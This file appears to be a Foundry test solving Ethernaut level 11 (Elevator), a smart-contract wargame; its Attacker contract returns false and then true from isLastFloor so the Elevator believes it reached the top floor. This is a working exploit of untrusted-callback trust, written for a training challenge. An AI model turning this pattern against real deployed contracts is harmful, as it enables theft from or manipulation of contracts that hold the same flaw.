pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IBuilding {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Attacker is IBuilding {
    bool called;
    IElevator elevator;

    constructor(IElevator _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(10);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (called) {
            return true;
        } else {
            called = true;
            return false;
        }
    }
}

contract Ethernaut11 is EthernautTest {
    constructor() EthernautTest(11) {}

    function solve() internal override(EthernautTest) {
        Attacker attacker = new Attacker(IElevator(instance));
        attacker.attack();
    }
}
